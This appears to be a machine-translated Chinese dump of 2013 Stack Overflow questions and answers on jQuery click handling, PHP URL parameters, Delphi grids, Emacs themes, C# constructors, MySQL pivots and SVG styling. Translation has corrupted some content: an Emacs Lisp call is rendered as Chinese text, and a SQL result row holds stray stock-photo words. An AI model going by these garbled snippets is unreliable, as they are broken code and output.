  margin-bottom:20px;
}
.disabledDiv {
    pointer-events: none;
    opacity: 0.4;
}
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script>
<div id="div1">
        <div id="div2" onclick="alert('Hello')">Click me</div>
        <input type="text" value="SAH Computer" />
        <br />
        <input type="button" value="SAH Computer" />
        <br />
        <input type="radio" name="sex" value="Male" />Male
        <Br />
        <input type="radio" name="sex" value="Female" />Female
        <Br />
    </div>
    <Br />
    <Br />
    <input type="button" value="Click" onclick="sah()" />
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2013-03-21T18:36:49.883

我认为内联脚本很难停止，你可以试试这个：

```
<div id="test">
    <div>Click Me</div>
</div> 
```

和脚本：

```
$(function () {
    $('#test').children().click(function(){
      alert('hello');
    });
    $('#test').children().off('click');
}); 
```

### [结帐小提琴并查看它的帮助](http://jsfiddle.net/WS47f/)

[阅读更多关于 .off()](http://api.jquery.com/off/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-21T18:38:26.777

您不能使用“禁用”来禁用点击事件。我不知道它在 IE6-9 中如何或是否有效，但它不适用于 Chrome，它不应该像那样在 IE10 上运行。

您也可以通过附加取消的事件来禁用 onclick 事件：

```
;(function () {
    function cancel () { return false; };
    document.getElementById("test").disabled = true;
    var nodes = document.getElementById("test").getElementsByTagName('*');
    console.log(nodes);
    for (var i = 0; i < nodes.length; i++) {
        nodes[i].setAttribute('disabled', true);
        nodes[i].onclick = cancel;
    }
}()); 
```

此外，直接在节点上设置“禁用”并不一定会添加属性 - 使用 setAttribute 可以。

[http://jsfiddle.net/2fPZu/](http://jsfiddle.net/2fPZu/)

# php - 从 url 获取数据以在下一页使用

> ID：15555304
> 
> 赞同：0
> 
> 时间：2013-03-21T18:27:05.747
> 
> 标签：php, mysql, url, hyperlink

我有一份报告，我还设置了一个链接。这是链接的代码片段：

```
<td><?php echo "<a href=http://www.ems-complete.com/patient-care-report/form/7/".$row2['id'].">Document Report</a>" ;?> </td> 
```

单击此链接时，我需要`$row2['id']`存储，以便可以使用它来显示另一个报告。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:36:32.920

您的登录页面如下所示：

```
http://www.ems-complete.com/component/users/?view=login 
```

后面的属性？可以在下一页通过 $_GET['view'] 请求获得。如果您尝试构建您的 url，以便以相同的方式将 $row2['id'] 分配给变量，则如下所示：

```
<td><?php echo "<a href=http://www.ems-complete.com/patient-care-report/form/7/?someproperty=".$row2['id'].">Document Report</a>" ;?> </td> 
```

那么你应该能够在下一页上得到它

```
$newvariable = $_GET['someproperty']; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:34:07.003

您可以链接保存该 ID 的内部脚本并将用户重定向到正确的链接。所以你会有

```
<td><?php echo "<a href=\"goto.php?id=".$row2['id']."\">Document Report</a>" ;?> </td> 
```

您的`goto.php`脚本将类似于：

```
<?php
//Save somewhere $_GET['id']
header('Location: http://www.ems-complete.com/patient-care-report/form/7/'.$_GET['id']);
?> 
```

当然，您还应该`$_GET['id']`在使用之前进行验证。

# delphi - StringGrid 单元格 Delphi

> ID：15555305
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:27:09.273
> 
> 标签：delphi, colors, click, cells, stringgrid

我已经编写了一些代码，根据数据列表在我的 delphi 应用程序中为我的 stringgrid 上的单个单元格着色。

我现在需要`OnDblClick`在我的 stringgrid 上的事件中编写一些代码来推断单元格是否是彩色的，然后根据找到的结果继续。例如：

```
DOUBLE CLICK CELL  
IS CELL COLOURED  
  YES > PROCEED A  
  NO > PROCEED B 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T22:41:04.677

将绘制时的颜色存储到预定义`TStringGrid.Objects`属性中。当需要取回时，可以从`Column`和`Row`坐标取回。这是一个简单的示例，它根据单元格是否为奇数列存储或存储在单元格中，并在选择单元格时将存储的值简单地显示为`clWhite`字符串`clBlack`。`Objects`它应该让你开始。

```
procedure TForm1.FormCreate(Sender: TObject);
var
  r, c: Integer;
const
  ColorSel: array[Boolean] of TColor = (clWhite, clBlack);
begin
  StringGrid1.RowCount := 10;
  StringGrid1.ColCount := 6;
  for c := 1 to StringGrid1.ColCount - 1 do
    for r := 1 to StringGrid1.RowCount - 1 do
    begin
      StringGrid1.Cells[c, r] := Format('C: %d R: %d', [c, r]);
      StringGrid1.Objects[c, r] := TObject(ColorSel[Odd(c)]);
    end;
end;

procedure TForm1.StringGrid1SelectCell(Sender: TObject; ACol, ARow: Integer;
  var CanSelect: Boolean);
begin
  ShowMessage(ColorToString(TColor(StringGrid1.Objects[ACol, ARow])));
end; 
```

您可以在`OnMouseUp`事件中轻松使用它来检测单元格中的颜色。删除`StringGrid1SelectCell`（使用对象检查器，只需删除事件的值）并将其添加`OnMouseUp`为网格的事件：

```
procedure TForm1.StringGrid1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  Col, Row: Integer;
begin
  StringGrid1.MouseToCell(X, Y, Col, Row);
  if (Col > -1) and (Row > -1) then
    ShowMessage(ColorToString(TColor(StringGrid1.Objects[Col, Row])));
end; 
```

然后处理双击变得非常容易（感谢@TLama 的大力协助）：

```
procedure TForm1.StringGrid1DblClick(Sender: TObject);
var
  IsDefaultColor: Boolean;
  CurrCellColor: TColor;
  CurrCol, CurrRow: Integer;
begin
  // Save typing by grabbing the currently selected cell col/row
  CurrCol := StringGrid1.Col;   
  CurrRow := StringGrid1.Row;

  // Get the stored color for the selected cell
  CurrCellColor := TColor(StringGrid1.Objects[CurrCol, CurrRow]);

  // See if it's been painted a different color than the default
  IsDefaultColor := (CurrCellColor = StringGrid1.Color);

  if not IsDefaultColor then
    HandleDifferentColorCell
  else
    HandleNormalColorCell;
end; 
```

请注意，如果您选择*不*更改单元格的颜色，则仍应将单元格的默认颜色分配给 ，`Objects[Column, Row]`以便在那里有一些有意义的东西，以避免在检索值时进行不正确的转换。

# emacs - Emacs for Windows 错误加载颜色主题

> ID：15555309
> 
> 赞同：5
> 
> 时间：2013-03-21T18:27:13.407
> 
> 标签：emacs, emacs24

我在 Windows 8 上使用 emacs 24.3。我已经从 marmalade 存储库安装了 solarized color 主题，并且可以使用`M`+进行设置`x` `load-theme`。当我使用自定义时，它也会为当前会话设置，但当我再次打开 emacs 时不会加载。

我可以打开自定义菜单并选择主题，但保存更改没有任何作用，并且与我的下一个会话之间没有任何变化。我在这里查看了几个关于颜色主题的问题，但大多数都不适用于 Emacs 24，因为我不需要使用`color-theme`它。

下面是我`.emacs`文件中的一个片段。

```
(custom-set-variables
  '(custom-enabled-themes (quote (solarized-dark)))
  '(custom-safe-themes (quote ("fc5fcb6f1f1c1bc01305694c59a1a861b008c534cae8d0e48e4d5e81ad718bc6" default)))
... 
```

当我尝试放入`(load-theme 'solarized-dark t)`my`.emacs`时，出现错误：

```
error: Unable to find theme file for `solarized-dark' 
```

我检查了`custom-theme-load-path`打开 emacs 后的值，它包括 elpa 用于存储日晒主题的目录。如上所述，我可以手动加载主题，但是在初始化期间加载它的一些事情是破坏性的。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-21T20:59:18.930

只需添加

（包初始化）

到您的 .emacs 文件的顶部，您就可以开始了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T09:59:17.767

**旁注：**如果主题作者已经处理了它，主题将自己添加到 中`custom-theme-load-path`，但这不是 的一部分，而是`deftheme`取决于实现此行为的各个主题作者。

为了解决这个问题，我制作了一个 emacslisp 的快速片段，它将找到名称中带有**主题**的包，然后将它们添加到`custom-theme-load-path`启动时。

只需将它添加到您的顶部附近`~/.emacs`或`~/.emacs.d/init.el`（即在您之前`load-theme`

它依赖于`s.el`和`dash.el`（都在 elpa 上可用）

```
(require 'dash)
(require 's)

(-each
 (-map
  (lambda (item)
    (format "~/.emacs.d/elpa/%s" item))
  (-filter
   (lambda (item) (s-contains? "theme" item))
   (directory-files "~/.emacs.d/elpa/")))
 (lambda (item)
   (add-to-list 'custom-theme-load-path item))) 
```

# c# - 我应该使用对象初始化器还是构造器？

> ID：15555312
> 
> 赞同：9
> 
> 时间：2013-03-21T18:27:23.487
> 
> 标签：c#, constructor, object-initializer

我刚刚了解了对象初始化器，并且想知道何时使用它们的最佳实践是什么。

这是我读到的关于它们的内容：http: [//msdn.microsoft.com/en-us/library/vstudio/bb384062.aspx](http://msdn.microsoft.com/en-us/library/vstudio/bb384062.aspx) 它清楚地表明它们对于创建匿名类型是必要的，但我想知道我是否应该在所有其他情况下，尽量选择它们而不是普通的构造函数。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-03-21T18:37:12.820

> 我想知道在所有其他情况下我是否应该尝试更喜欢它们而不是普通的构造函数。

我会说不。

构造函数有很多优点。使用构造函数，编译器将强制为您的类型提供所有必需的数据。这意味着您可以使您无法创建处于无效状态的类型的实例，从而可以主动防止许多错误。

另一方面，对象初始化器会产生许多缺点。您必须为需要初始化的任何数据提供可公开设置的属性。它们在构建时不是必需的，因此您类型的用户可能会意外遗漏一些数据。

通常，构造函数中应该需要您的类运行*所需的任何内容。*即使您有自定义构造函数，仍然可以使用对象初始值设定项，但只能用于在您的类中设置可选的数据。在初始化中混合两者都很好，这意味着你可以这样做：

```
var yourInst = new YourClass(req1, req2) { OptionalProperty = opt1 } 
```

这可以帮助减少所需的构造函数重载的数量（类似于使用[可选参数](http://msdn.microsoft.com/en-us/library/dd264739.aspx)，但没有可选参数中版本控制的一些缺点）。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-03-21T18:32:06.127

我相信你在混淆事情。

对象初始化器**将**调用类的默认（或指定）构造函数！所以你不能真正使用对象初始化器*而不是*普通的构造器。因此，当使用对象初始值设定项时，无论如何您都在调用构造函数。

如果您想知道您正在设计的类的对象初始化器，那么答案仍然适用。确保提供有意义的必要构造函数。您不需要做任何特别的事情来启用/允许对象初始化器。它们是自 3.0 版以来 C# 编译器提供的语法糖，允许类的用户在构造后立即初始化类的公共成员。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-03-21T18:33:03.520

一个好的经验法则是：

*   如果需要使类正常工作，它应该是构造函数参数
*   如果改变它会破坏类，它应该是一个构造函数参数
*   如果它是可选的，具有合理的默认值，和/或简单而安全地更改类的行为方式，则它应该是一个初始化程序。

初始化器的主要优点是您不必*在*创建对象时设置它们 - 您可以稍后根据其他逻辑设置它们。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-21T18:27:23.487

我目前看到使用它们存在以下问题：

1.  分配的属性必须是可更改的。这似乎是不可取的，因为如果将数据传递给构造函数，我可以在那里检查它并在提供的数据不足或错误时使对象创建失败。如果可以为数据分配一个属性，我突然必须弄清楚我的对象的状态是什么，是否一切都已正确创建，或者我可能处于哪种其他状态。
2.  分配的属性必须是公共的。这意味着对原本可能是私有的东西的访问将不得不被公开，然后通过使用接口或类似的东西来限制。

所以我的工作理论是：不要使用对象初始化器，它们会鼓励愚蠢的事情。

# grails - 在 groovy/grails 中序列化后获取对象类型

> ID：15555314
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:27:23.830
> 
> 标签：grails, serialization, web, groovy

嘿伙计们，如果你能帮助我，我将不胜感激。首先请原谅我的英语，其次我会尽力描述这个问题。

据我所知，在 grails 中的 submitToRemote 之后，表单参数被序列化然后提交。现在的问题是：在两个 GSP 页面之间，我试图`ArrayList<foo>`来回发送一个。要将它保存在我正在使用的每个页面上`<g:hiddenField>`，然后使用参数在控制器中使用它。提交表单后，控制器不能再使用 arrayList，因为它是字符串类型。我也将在不使用 cookie 或会话的情况下执行此操作。

关于如何在提交后转换为反序列化 arrayList 的任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:10:32.687

假设这很简单，`ArrayList<Integer>`您可以使用`list()`.`params`

```
def myList = params.list('myList') //myList is the name in the view. 
```

如果它是一个更复杂的列表，例如一个域类的列表，那么您需要使用命令。

```
Class A {
  String name
}

Class ACommand {
  List<A> listA = ListUtils.lazyList( [], FactoryUtils.instantiateFactory(A) )
} 
```

**看法**

```
<g:hiddenField name="listA[0].name" value="Fisrt Name" />
<g:hiddenField name="listA[1].name" value="Second Name" /> 
```

**绑定命令**

```
class MyController {
  def someAction() {
    //in this example assume that this action is called in the submit of the form
    ACommand command = new ACommand()
    bindData(command, params) //this will populate the command with your list
  }
} 
```

# php - 为什么，如果有的话，你需要在分配给它之前刷新一个变量？

> ID：15555317
> 
> 赞同：1
> 
> 时间：2013-03-21T18:27:25.810
> 
> 标签：php, wordpress

在此片段中，*Professional WordPress Design and Development, 2nd Edition*的作者将 PHP 变量 ($wp_query)*设置为 NULL 以将其完全刷新干净*。

为什么在分配给它之前需要这样做？

```
<?php
$temp = $wp_query;
$wp_query= null;/***here***/
$paged = ( get_query_var( 'paged' ) ) ? get_query_var( 'paged' ) : 1;
$wp_query = new WP_Query( 'posts_per_page=5&paged='.$paged );/***here***/
while ( $wp_query->have_posts() ) : $wp_query->the_post();
?>

<h2>
<a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
</h2>
<?php the_excerpt(); ?>
<?php endwhile; ?>
<div class="navigation">
<div class="alignleft"><?php previous_posts_link( '&laquo; Previous' ); ?></div>
<div class="alignright"><?php next_posts_link( 'More &raquo;' ); ?></div>
</div>
<?php
$wp_query = null;/***here***/
$wp_query = $temp;/***here***/
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:33:29.680

你真的不需要这样做。通常的做法是在初始化之前避免对其进行测试（比如`if($var)`before`$var`得到一个值）。

除了保持低内存消耗外，实际上不需要`unset`ing 变量。因此，如果您有一个漫长的过程，如果您取消设置中间变量，您可能会使用更少的峰值内存。

作为释放内存的示例，请考虑以下示例：

```
$a = array(1,2,3,4,5,6,7,8,9,0);
print memory_get_usage().'/'.memory_get_usage(true).'<br />';
$a = 1;
print memory_get_usage().'/'.memory_get_usage(true).'<br />'; 
```

在我的一台服务器上运行，输出是这样的：

```
622808/786432
621216/786432 
```

第一个数字是您分配给脚本的内存，第二个数字是从操作系统分配的 PHP（据我了解——如果有错误请纠正我）。这些数字以字节为单位。

所以你可以看到内存被有效地释放给 PHP，而不是系统。一旦线程终止，线程内存就会被释放回操作系统。请注意，使用`memory_get_usage(true)`实际调用垃圾收集器，这可以降低密集脚本中的峰值消耗。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:52:35.607

在程序顶部初始化变量并不少见，您的示例就是这样做的，尽管有些不必要。

初始化变量是为了让阅读代码的人可以看到将在代码中进一步使用的变量。如果您只在需要时初始化变量，那么它可能会使代码更难以一目了然。

至于好的/坏的做法，它在这里并没有真正发挥作用。这是一种有其时间和地点的编码风格。它在编写适当的算法时特别有用，在这种情况下您需要将舌头伸直放在嘴里，但在编写简单的代码时，并不总是需要这样做。

至于最后两行，它们似乎什么也没做（除非这只是代码的一部分）。变量只是设置为`null`，然后设置为`$temp`，就是这样。如果这确实是代码的结尾，那么您可以根据需要将其删除。

# winforms - 添加 TableLayoutPanel 后直接寻址 UserControl 中的控件

> ID：15555326
> 
> 赞同：0
> 
> 时间：2013-03-21T18:28:07.040
> 
> 标签：winforms, user-controls, tablelayoutpanel

我最近在我的 WinForms 项目中重构了一个用户控件的代码，并将它从一个带有文本框、组合和按钮的用户控件更改为现在包含一个 TableLayoutPanel 的用户控件，它包含所有以更好的顺序进行控制。

我的问题是，在许多地方，代码直接通过 Controls 字典解决嵌套在用户控件中的控件 - 例如：`MyUserControl.Controls["NameOfTextBox"].Visible = false;`

现在，在我将文本框和按钮嵌套在 TableLayoutPanel 中之后，我不能再进行这样的寻址了，现在我应该写`MyUserControl.Controls[0].Controls["NameOfTextBox"].Visible = false;`，否则我会得到一个异常。

我的问题是我是否应该在每个处理用户控件内容的地方更改我的所有代码，或者你能提供一些解决方法来在用户控件本身上实现，所以当我尝试直接处理控件时，它会将其转发到 TableLayoutPanel 的内容。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:30:13.957

> 我的问题是，在许多地方，代码直接解决了嵌套在用户控件中的控件...

这大概是核心问题。尝试为您的 UserControl 创建属性：

```
public bool NameBoxVisible {
  get { return NameOfTextBox.Visible; }
  set { NameOfTextBox.Visible = value; }
} 
```

然后，您可以直接在 UserControl 中引用控件，但为控件的使用者提供关注点分离。

# mysql - MySQL - 按列分组数据

> ID：15555327
> 
> 赞同：0
> 
> 时间：2013-03-21T18:28:07.420
> 
> 标签：mysql, database

[作为我在第一篇文章](https://stackoverflow.com/questions/15494171/excel-pivot-table-multiple-columns)中寻求帮助将数据处理到 excel 数据透视表中的后续工作，我假设这只能通过使用联合的数据库命令来完成。因此，我提交了一个具有相同数据的新问题，但从 MySQL 的角度来看。

我有以下表格：

```
mysql> select * from ilike;
+-----------+------------+----------+
| likebread | likecheese | likemilk |
+-----------+------------+----------+
| girl      | boy        | girl     |
| boy       | girl       | boy      |
| boy       | boy        | boy      |
| boy       | boy        | girl     |
| boy       | boy        | boy      |
| boy       | girl       | boy      |
| girl      | boy        | girl     |
| boy       | girl       | girl     |
| boy       | boy        | girl     |
| girl      | boy        | boy      |
+-----------+------------+----------+
10 rows in set (0.00 sec) 
```

我想对各个列中的数据进行计数和分组，以便最终结果是一个表格，显示每个列中男孩和女孩的计数，如下所示：

```
 +-----------+------------+----------+
        | likebread | likecheese | likemilk |
+-------+-------+------------+--------------+
| boys  | 7         | 7          | 5        |
| girls | 3         | 3          | 5        |
+-------+-----------+------------+----------+ 
```

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:36:51.850

这是一种方法：

```
select g.gender,
       sum(case when likebread=g.gender then 1 end) likebread,
       sum(case when likecheese=g.gender then 1 end) likecheese,
       sum(case when likemilk=g.gender then 1 end) likemilk
from (select 'girl' gender union select 'boy') g
cross join ilike
group by g.gender 
```

**结果**

```
| 性别 | 喜欢面包 | 像奶酪 | 像牛奶 |
----------------------------------------------
| 男孩 | 7 | 7 | 5 |
| 女孩| 高分辨率照片| CLIPARTO 3 | 3 | 5 |
```

[查看演示](http://sqlfiddle.com/#!2/9dcf21/5)

# html - MySQL中的HTML多选存储

> ID：15555333
> 
> 赞同：0
> 
> 时间：2013-03-21T18:28:33.050
> 
> 标签：html, mysql, select, data-structures

有没有什么好的解决方案可以在一个字段中存储`HTML`多个选择文件？`MySQL`

我尝试使用一个有 5 个选项的 MySQL 表，其中一个`<select>`有 5 个选项，但是对于 40-50 个选择框，或者例如一个多国家选择器，这不太舒服。

```
<select id="country" multiple="multiple">
   <option value="1">USA</option>
   <option value="2">Canada</option>
   <option value="3">Peru</option>
   ...
</select> 
```

在 MySQL 查询中，我也想使用多个值，如下所示：

```
SELECT * FROM tbl1 WHERE country IN (1,5,20,55); 
```

是否有一些数据结构或数据类型......或者存储这个可搜索的东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:36:49.417

每个用户都有一个查询列，它只存储 Where In 字符串。然后你可以得到那个字符串

```
SELECT string FROM users WHERE id = userid
variable = queryresults;

SELECT * FROM tbl1 WHERE country IN (variable); 
```

# correlation - LoadRunner 的一般相关性

> ID：15555336
> 
> 赞同：0
> 
> 时间：2013-03-21T18:28:39.257
> 
> 标签：correlation, loadrunner

一般来说，来自服务器的任何东西都可以关联吗？只要在服务器端创建并在服务器响应中传递，所有记录的唯一值都可以关联？对于从服务器返回的 http 标头中的相关值，特别是使用“scope=headers”对吗？“范围”还有哪些其他价值？我知道身体，但还有其他人吗？

无法关联通过即 JavaScript 生成的客户端值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:39:40.943

相关值从 HTTP 响应流内部的服务器返回。如果您需要来自 Javascript 的值，那么您有几个路径

*   将您的 javascript 函数转换为您的虚拟用户的语言（C、VB、Java 等...）
*   运行 truClient，它将 JavaScript 作为一个成熟的浏览器执行。

# ios - 完善我的 MagicalRecord 导入

> ID：15555338
> 
> 赞同：6
> 
> 时间：2013-03-21T18:28:41.287
> 
> 标签：ios, objective-c, core-data, magicalrecord

对，只是清理这个问题，希望找到答案。

我一直在关注这个博客来让我的导入工作。

[http://www.cimgf.com/2012/05/29/importing-data-made-easy/](http://www.cimgf.com/2012/05/29/importing-data-made-easy/)

当 JSON 在表单中时，我设法使导入工作完美......

```
[
    {
        Name: "John Smith",
        Id: 123,
        Company:
        {
            Name: "Apple",
            Id: 1
        }
    }
] 
```

即当 JSON 包含实际对象时。

导入将找到对象并更新现有对象，而不是创建新对象。

但是，我拥有的一些 JSON 格式...

```
[
    {
        Name: "John Smith",
        Id: 123,
        CompanyID: 1
    }
] 
```

无论我做什么，它都会产生重复。

请有人告诉我 Magical Record 的用户信息设置是为了让它工作。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-23T20:53:02.130

感谢您的提问，虽然我已经使用了一段时间，但我能够成功使用 MagicalRecord 的导入功能。我能够为您的问题找到解决方案。

我猜 MagicalRecord 约定将 personID 用于 Person，将 companyID 用于 Company。由于它在我们的控制之下，因此需要注意。如果我错了，请纠正我。从实体的属性中删除下划线后，它就不再崩溃了。

我已经对下面提到的解决方案进行了全面测试，请参阅我使用的[演示项目代码](http://dl.dropbox.com/u/35012982/Demo%20Projects/TestMagicalImport.zip)。因此，请随时提出问题。

```
Company
-------------
companyID (unique) //Removed underscore from the property
companyName
-------------
persons

Person
-------------
personID (unique) //Removed underscore from the property
firstName
lastName
-------------
company 
```

对于这种格式：

```
{
        Id: 1,
        FirstName: "John",
        LastName: "Smith"
        Company :
        {
            Id: 123
        }
    }
} 
```

以下应为公司关系的 userInfo 中提供的人

`mappedKeyName : Company`（在 JSON 的 key 中使用）

`relatedByAttribute : companyID`（公司实体中的唯一属性名称）

对于这个模型：

```
{
    Id: 1,
    FirstName: "John",
    LastName: "Smith"
    CompanyId: 123
} 
```

`mappedKeyName : CompanyId`（在 JSON 的 key 中使用）

`relatedByAttribute : companyID`（公司实体中的唯一属性名称）

# asp.net-mvc-4 - Html.ActionLink 内联 if 语句

> ID：15555343
> 
> 赞同：0
> 
> 时间：2013-03-21T18:28:57.913
> 
> 标签：asp.net-mvc-4, html.actionlink

这就是我现在所拥有的，效果很好：

```
@Html.ActionLink("Home", "Index", "Home", null, (ViewBag.SelectedPage == CurrentPageEnums.SelectedViewEnum.Home) ? new { @class = "current"} : null) 
```

我正在尝试做的是也给它一个 ID，即使条件为假，也要保留该 ID。所以是这样的：

```
@Html.ActionLink("Home", "Index", "Home", null, (ViewBag.SelectedPage == CurrentPageEnums.SelectedViewEnum.Home) ? new { @class = "current", id = "Home" } : new { id = "Home" }) 
```

另外，我想设置一个`onclick()`功能，而不是将点击定向到控制器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T09:13:29.953

AFAIK，`@Html.ActionLink()`帮助程序只是为了创建到控制器的链接。但是有一个非常简单的解决方法可以解决您为其分配 onclick() 函数的问题。

示例：（我假设 onclick 事件的 javascript 函数）

```
<script type="text/javascript">
  function foo(string){
    alert(string);
    return false; //Very Important
  }
</script> 
```

那么对于 ActionLink 你可以放：

```
@Html.ActionLink("Home", "", "", null, (ViewBag.SelectedPage == CurrentPageEnums.SelectedViewEnum.Home) ? new { @class = "current", @id = "Home",onclick="javascript:foo('foo2');" } : new { @id = "Home" }) 
```

注意`return false`JS函数中的部分。如果您不希望在单击 ActionLink 后刷新页面，这一点非常重要。在 ActionLink 的 ActionName 和 RouteValues 中输入空字符串也会阻止它调用控制器。

至于您的 ID 问题的第一部分，请记住将 @ 放在 id 之前：

```
@Html.ActionLink("Home", "Index", "Home", null, (ViewBag.SelectedPage == CurrentPageEnums.SelectedViewEnum.Home) ? new { @class = "current", @id = "Home" } : new { @id = "Home" }) 
```

所以最终的 ActionLink 看起来像这样：

```
@Html.ActionLink("Home", "", "", null, (ViewBag.SelectedPage == CurrentPageEnums.SelectedViewEnum.Home) ? new { @class = "current", @id = "Home",onclick="javascript:somefunction()" } : new { @id = "Home" }) 
```

说了这么多，我不确定你是否可以指定`: new {@id = "Home"}`

所以要解决这个问题，我会建议这样的事情：

```
@if(ViewBag.SelectedPage == CurrentPageEnums.SelectedViewEnum.Home)
{
  @Html.ActionLink("Home", "", "", null, new { @class = "current", @id = "Home", onclick="javascript:alert('True');return false;" })
}
else
{
//Not sure what you would like to put in the else clause
@Html.ActionLink("Home", "", "", null, new { @class = "current", @id = "Home", onclick="javascript:alert('False');return false;"})
} 
```

# solr - 如何在 SOLR 中进行另一个搜索调用

> ID：15555344
> 
> 赞同：1
> 
> 时间：2013-03-21T18:29:10.817
> 
> 标签：solr

我想在 SOLR 中实现某种后备查询机制。也就是说，如果第一次搜索调用没有产生足够的结果，我想用不同的排名进行另一个调用，然后组合结果并返回它。我想这可以在 SOLR 客户端完成，但我希望在 SOLR 内完成。通过阅读文档，我想我需要实现一个搜索组件，然后将其添加到“查询”组件旁边？在这方面的任何参考或经验将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-23T12:13:05.450

SearchHandler 按照您定义的顺序调用所有注册的搜索组件，并且有几个阶段（准备、处理等）。您仅在分布式处理阶段之后才知道结果数（我假设您使用分布式模式），因此您的自定义搜索组件应检查响应对象中的结果数并在必要时运行自己的查询。实际上，您可以为此继承（或包装）一个常规 QueryComponent ，从而增加其流程/分布式流程阶段。

# wpf - viewmodel 属性上的 PropertyChanged 事件

> ID：15555346
> 
> 赞同：-3
> 
> 时间：2013-03-21T18:29:16.963
> 
> 标签：wpf, blend, interaction, eventtrigger

我正在尝试使用交互触发器在我的 ViewModel 中的 Property 上引发 PropertyChanged 事件。

CS ：

```
public string MyContentProperty
{
    get { return "I Was Raised From an outside Source !";}
} 
```

XAML：

```
<Button Content="{Binding MyContentProperty}">
    <i:Interaction.Triggers>
        <i:EventTrigger EventName="Button.Click">
               < .... what needs to be done ?>         
        </i:EventTrigger>                        
     </i:Interaction.Triggers>
</Button> 
```

当然，如果对这个问题有任何疑问，您可以参考

```
 xmlns:ei="clr-namespace:Microsoft.Expression.Interactivity.Core;assembly=Microsoft.Expression.Interactions" 
 xmlns:i="clr-namespace:System.Windows.Interactivity;assembly=System.Windows.Interactivity" 
```

随时为您服务，在此先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T22:29:16.870

您可以使用普通命令或 Expression Blend 的[CallMethodAction](http://msdn.microsoft.com/en-us/library/ff723947%28v=expression.40%29.aspx)、[InvokeCommandAction](http://msdn.microsoft.com/en-us/library/ff724018%28v=expression.40%29.aspx)或[ChangePropertyAction](http://msdn.microsoft.com/en-us/library/ff723951%28v=expression.40%29.aspx)。

这里有四种方法可以做你想做的事：

```
<Button Content="Button" Height="23" Width="100" Command="{Binding RaiseItCmd}">
    <i:Interaction.Triggers>
        <i:EventTrigger EventName="Click">
            <i:InvokeCommandAction Command="{Binding RaiseItCmd}"/>
            <ei:CallMethodAction MethodName="RaiseIt" TargetObject="{Binding}"/>
            <ei:ChangePropertyAction Value="" 
                     PropertyName="MyContentProperty" TargetObject="{Binding}"/>
        </i:EventTrigger>
    </i:Interaction.Triggers>
</Button> 
```

这里我使用 MVVM Light 的 ViewModelBase：

```
using System.Windows.Input;
using GalaSoft.MvvmLight;
using Microsoft.Expression.Interactivity.Core;

public class ViewModel : ViewModelBase
{
    public ViewModel()
    {
        RaiseItCmd = new ActionCommand(this.RaiseIt);
    }

    public string MyContentProperty
    {
        get
        {
            return "property";
        }
        set
        {
            this.RaiseIt(); 
        }
    }

    public void RaiseIt()
    {
        RaisePropertyChanged("MyContentProperty");
    }

    public ICommand RaiseItCmd { get; private set; }
} 
```

# javascript - getElementsByClassName 和 …ByTagName， 和 , using onclick="" to change styles

> ID：15555348
> 
> 赞同：0
> 
> 时间：2013-03-21T18:29:18.927
> 
> 标签：javascript, css, svg, onclick

希望我的问题符合标准（我整个早上都在研究这个，所以我希望我足够彻底）

我正在学习所有这些新的 html5，所以我可以使用 SVG`<canvas>`和 CSS3 使用一点 Javascript 制作交互式绘图。我试图摆脱我做事的丑陋、冗余的功能，并很好地整理我的编码。

我在为`<button>`的 onclick 事件创建 javascript 以更改包含 SVG 中所有路径的类的样式时遇到问题`document.getElementsByClassName`。我已经可以使用它了`document.getElementById`，但是我想一次影响多条路径，而不必浪费大量的行来将数百个 ID 抓取到一个 var 或类似的东西中。

到目前为止，这是我的代码，第一个按钮有效，接下来的两个是我遇到的问题。

```
<head>
<style>
  .pathclass { 
fill:none;
stroke:#ffffff;
stroke-width:4; }
</style></head>

<body>

<button onclick="document.getElementById('pathId').style.stroke = '#000000';" />
<br />
<button onclick="document.getElementsByClassName('pathClass').style.stroke = '#000000';" />
<br />
<button onclick="document.getElementsByTagName('path').style.stroke = '#000000';" />

<svg><g><path id="pathId" class="pathclass" /></g></svg> 
```

接下来，我想`classNames`使用类似的东西自动设置所有`document.getElementsTagName('path').className = 'pathclass'`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:46:33.847

当你这样做时`document.getElementsByClassName`，它会返回一个 NodeList。NodeList 类似于数组，您必须遍历它才能应用样式：

```
// collect all nodes with class='oldclass'
var nodes = document.getElementsByClassName('oldclass');
// loops to get each node in our NodeList
for (var i=0, length = nodes.length; i < length; i++) {
   // i starts at 0 and increments with each loop (i++ increments i on each iteration)
   // it won't stop until it reaches the number of nodes (i < length)
   // so on the first iteration it will be nodes[0]
   // which is your first element, the second time
   // it will be nodes[1] which is your second, and so on
   nodes[i].style.stroke = "black";
}

var paths = document.getElementsByTagName('path');
for (var i=0, length = paths.length; i < length; i++) {
   paths[i].className = "newclass";
} 
```

